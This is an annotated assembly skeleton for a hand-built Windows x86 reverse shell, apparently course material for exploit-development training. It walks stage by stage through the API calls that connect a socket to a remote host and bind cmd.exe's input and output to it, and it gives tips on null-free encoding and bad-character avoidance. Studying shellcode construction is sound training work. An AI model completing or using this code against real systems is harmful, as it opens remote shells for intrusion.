; reverse_shell.asm — annotated skeleton for a hand-rolled Windows x86 reverse shell.
; Educational scaffold for OSED "Creating Custom Shellcode". Assemble with:
;   nasm -f bin reverse_shell.asm -o reverse_shell.bin
; Then extract bytes (see 03-shellcode/build.md) and badchar-check before use.
;
; This shows the STRUCTURE and API call order. The PEB-walk + hash-resolve block is
; sketched; fill in the resolver you practice with. The point is to understand each
; stage, not to have a magic blob.

BITS 32

;===============================================================================
; STAGE 0: find kernel32 base via the PEB, resolve needed APIs by hash.
;===============================================================================
; fs:[0x30]      -> PEB
; PEB+0x0C       -> Ldr
; Ldr+0x14       -> InMemoryOrderModuleList
; walk list, for each module parse export dir, ror13-hash names, match wanted hashes:
;   LoadLibraryA, WSAStartup, WSASocketA, WSAConnect (or connect), CreateProcessA
;
; Store resolved addresses in registers or on the stack for the stages below.
; (Implement find_function / hashing here — practice this until you can write it cold.)

start:
    ; --- prologue: make stack room, zero a scratch register ---
    xor    eax, eax

;===============================================================================
; STAGE 1: LoadLibraryA("ws2_32.dll")
;===============================================================================
    ; push "ws2_32.dll\0" onto the stack (in reverse dword chunks, null-free)
    ; mov  ecx, esp            ; ecx -> "ws2_32.dll"
    ; push ecx
    ; call [LoadLibraryA]

;===============================================================================
; STAGE 2: WSAStartup(MAKEWORD(2,2), &WSAData)
;===============================================================================
    ; sub  esp, 0x190          ; room for WSAData struct
    ; mov  edx, esp
    ; push edx                 ; lpWSAData
    ; push 0x0202              ; wVersionRequired = 2.2
    ; call [WSAStartup]

;===============================================================================
; STAGE 3: WSASocketA(AF_INET=2, SOCK_STREAM=1, 0, 0, 0, 0) -> socket in EAX
;===============================================================================
    ; xor  eax, eax
    ; push eax                 ; dwFlags
    ; push eax                 ; g
    ; push eax                 ; lpProtocolInfo
    ; push eax                 ; protocol
    ; inc  eax
    ; push eax                 ; type = SOCK_STREAM (1)
    ; inc  eax
    ; push eax                 ; af = AF_INET (2)
    ; call [WSASocketA]
    ; mov  esi, eax            ; save socket handle in esi

;===============================================================================
; STAGE 4: connect(s, sockaddr_in{2, htons(PORT), inet_addr(IP)}, 16)
;===============================================================================
    ; Build sockaddr_in on the stack:
    ;   push  IP   (e.g. 0x0100007f for 127.0.0.1, byte order = raw)
    ;   push  0xBB01 0002  -> family=2 (AF_INET) + port=443 (0x01BB) network order
    ; NOTE: choose PORT/IP so the encoded bytes avoid your badchars, or xor-encode them.
    ; mov  ecx, esp           ; ecx -> sockaddr_in
    ; push 16                 ; namelen
    ; push ecx                ; name
    ; push esi                ; socket
    ; call [connect]

;===============================================================================
; STAGE 5: CreateProcessA("cmd", ..., STARTUPINFO with std handles = socket)
;===============================================================================
    ; Zero a STARTUPINFOA (~68 bytes) on the stack, set:
    ;   si.cb = sizeof, si.dwFlags = STARTF_USESTDHANDLES (0x100),
    ;   si.hStdInput = si.hStdOutput = si.hStdError = esi (socket)
    ; Build "cmd\0" on the stack, ecx -> it.
    ; Push all CreateProcessA args (10), call [CreateProcessA].
    ; -> cmd.exe I/O is wired to the socket = interactive reverse shell.

;===============================================================================
; STAGE 6: exit cleanly (optional) — ExitThread/ExitProcess or just fall through.
;===============================================================================
    ; call [ExitProcess]  (or ExitThread to keep the host service alive)

; ------------------------------------------------------------------------------
; Practice targets, in order of difficulty:
;   1. WinExec("calc")               — one API, learn the resolver.
;   2. This reverse shell            — the full 6-stage chain.
;   3. Make it 100% null-free        — xor tricks, al loads, encoded IP/port.
;   4. Shrink it                     — reuse registers, minimize pushes.
; ------------------------------------------------------------------------------
